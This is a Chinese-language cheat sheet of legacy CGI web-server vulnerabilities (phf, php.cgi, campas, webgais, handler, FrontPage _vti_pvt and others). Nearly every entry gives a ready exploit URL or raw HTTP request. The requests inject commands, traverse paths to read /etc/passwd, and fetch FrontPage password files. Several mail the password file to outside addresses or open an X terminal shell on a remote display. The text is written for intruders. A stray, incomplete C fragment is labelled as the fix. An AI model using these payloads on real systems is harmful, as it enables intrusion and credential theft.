描述：在NCSA 或者 Apache (1.1.1版本以内)非商业版本的Web Server中有一段程序util.c,允许黑客以root身份执行任何一个指令:

http://www.xxx.com/cgi-bin/phf?Qname=root%0Asome%20command%20here
http://www.victim.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

　

名字：php.cgi 2.0 beta10 或更早版本
描述：包括缓存溢出漏洞，还有导致任何系统文件可以被入侵者读取的漏洞读nobody权限:

http://www.victim.com/cgi-bin/php.cgi?/etc/passwd
php.cgi2.1版本的只能读shtml文件了. 对于密码文件,同志们要注意一下,也许可能在/etc/master.passwd　　/etc/security/passwd等.

　

名字：whois_raw.cgi
描述：因为whois_raw.cgi作者的失误，这个CGI将使入侵者能够以您系统上启动httpd的用户的权限执行您系统上任意的命令:

http://www.victim.com/cgi-bin/whois_raw.cgi?fqdn=%0acat%20/etc/passwd

　

名字：faxsurvey
描述：在Linux S.u.S.E上/cgi-bin目录下的faxsurvey程序允许入侵者无须登录就能在服务器执行指令:

http://www.victim.com/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd

　

名字：pfdispaly.cgi
描述：在Irix6.4或者更早版本的web服务器上，/cgi-bin/pfdisplay程序允许入侵者非法查看服务器上的文件:

lynx -source 'http://www.victim.com/cgi-bin/pfdispaly.cgi?/../../../../etc/motd'

pfdisplay.cgi还有另外一个漏洞可以执行命令:

lynx -dump http://www.victim.com/cgi-bin/pfdispaly.cgi?'%0a/bin/uname%20-a/'

lynx -dump http://victim/cgi-bin/pfdispaly.cgi?'%0A/usr/bin/X11/xclock%20-display%20evil:0.0/

　

名字：wrap
描述：/cgi-bin/wrap程序有两个漏洞，均允许入侵者获取服务器上文件的非法访问,如:

http://www.victim.com/cgi-bin/wrap?/../../../../../etc　

　


名字：www-sql
描述：www-sql存在于/cgi-bin/目录下，这将导致入侵可以越权访问被保护的文件.在你的浏览器里输入"http://your.server/protected/something.html",被要求输入帐号和口令.而有www-sql就不必了:

http://your.server/cgi-bin/www-sql/protected/something.html

解决方法：


while(FCGI_Accept() >= 0)
{

s = getenv("REDIRECT_STATUS");
if(!s) {
puts("Content-type: text/plain\r\n\r\nPHP/FI detected an internal error. Please inform sa@hogia.net of what you just did.\n");
exit(1);
}
s = getenv("PATH_TRANSLATED");

　

名字：view-source
描述：在cgi-bin目录下的view-source程序没有对输入进行安全检查，使入侵者可以查看服务器上的任何文件:

http://www.victim.com/cgi-bin/view-source?../../../../../../../etc/passwd

　

名字：campas
描述：在cgi-bin目录下的campas程序有一个毛病可以使入侵者随意查看server上的重要文件:

http://www.victim.com/cgi-bin/campas?%0acat%0a/etc/passwd%0a 或

telnet www.xxxx.net 80
Trying 200.xx.xx.xx...
Connected to venus.xxxx.net
Escape character is '^]'.
GET /cgi-bin/campas?%0acat%0a/etc/passwd%0a

　

名字：webgais
描述：/cgi-bin，目录下的webgais是GAIS搜索工具的一个接口,它有一个毛病使入侵者可以绕过程序的安全机制，执行系统命令:

telnet www.victim.com 80
POST /cgi-bin/webgais HTTP/1.0
Content-length: 85 (replace this with the actual length of the "exploit"line)
query=';mail+drazvan\@pop3.kappa.ro</etc/passwd;echo'&output=subject&domain=paragraph

　

名字：websendmail
描述：/cgin-bin目录下的websendmail程序允许入侵者执行一个系统指令：

telnet www.victim.com 80
POST /cgi-bin/websendmail HTTP/1.0
Content-length: xxx (should be replaced with the actual length of the
string passed to the server, in this case xxx=90)
receiver=;mail+your_address\@somewhere.org〈/etc/passwd;&sender=a&rtnaddr=a&subject=a&content=a

　

名字：handler
描述：IRIX 5.3, 6.2, 6.3, 6.4的/cgi-bin/handler程序存在缓存溢出错误，允许入侵者在server上远程执行一段程序:

telnet www.victim.com 80
GET /cgi-bin/handler/whatever;cat<tab>/etc/passwd| ?data=Download HTTP/1.0
GET /cgi-bin/handler/useless_shit;cat<tab>/etc/passwd/?data=DownloadHTTP/1.0
GET /cgi-bin/handler/blah;xwsh　-display　yourhost.com/?data=Download
GET /cgi-bin/handler/<tab>xterm<tab>-display〈tab>danish:0<tab>-e<tab>/bin/sh/<tab>?data=Download

注意,cat后是TAB键而不是空格,服务器会报告不能打开useless_shit,但仍旧执行下面命令.

　

名字：test-cgi or nph-test-cgi
描述：http://www.victim.com/cgi-bin/test-cgi?\whatever

http://www.victim.com/cgi-bin/test-cgi?\help&0a/bin/cat%20/etc/passwd

http://www.victim.com/cgi-bin/nph-test-cgi?/*

GET /cgi-bin/test-cgi?* HTTP/1.0
GET /cgi-bin/test-cgi?x *
GET /cgi-bin/nph-test-cgi?* HTTP/1.0
GET /cgi-bin/nph-test-cgi?x *
GET /cgi-bin/test-cgi?x HTTP/1.0 *
GET /cgi-bin/nph-test-cgi?x HTTP/1.0 *

　

名字：root or 'root
描述：对于某些BSD的apache可以:http://www.victim.com/root/etc/passwd

http://www.victim.com/'root/etc/passwd

　


名字：_vti_inf.html

描述： web根目录下存在_vti_inf.html文件,该文件是Frontpage extention server的特征,包含了一系列Frontpage Extention Server的重要信息;而且Frontpage Extention server是一个有很多漏洞的web服务,用它入侵者可能直接修改首页文件，如果你读http://www.victim.com/_vti_inf.html你将得到FP extensions的版本和它在服务器上的路径. 还有一些密码文件如:

http://www.victim.com/_vti_pvt/service.pwd
http://www.victim.com/_vti_pvt/users.pwd
http://www.victim.com/_vti_pvt/authors.pwd
http://www.victim.com/_vti_pvt/administrators.pwd

　

名字：edit.pl

描述： /cgi-bin/edit.pl有一个安全弱点,用下面这条命令就可以访问用户的配置情况

http://www.sitetracker.com/cgi-bin/edit.pl?account=&password=

　


名字：htmlscript
描述： 安装了htmlscript2.99x或者更早版本的服务器，存在一个毛病使入侵者可以查看服务器上的任何文件:

http://www.victim.com/cgi-bin/htmlscript?../../../../etc/passwd

　

名字：Vulnerability in Glimpse HTTP
描述：

telnet target.machine.com 80
GET /cgi-bin/aglimpse/80/IFS=5;CMD=5mail5fyodor\@dhp.com\</etc/passwd;eval$CMD;echo　HTTP/1.0
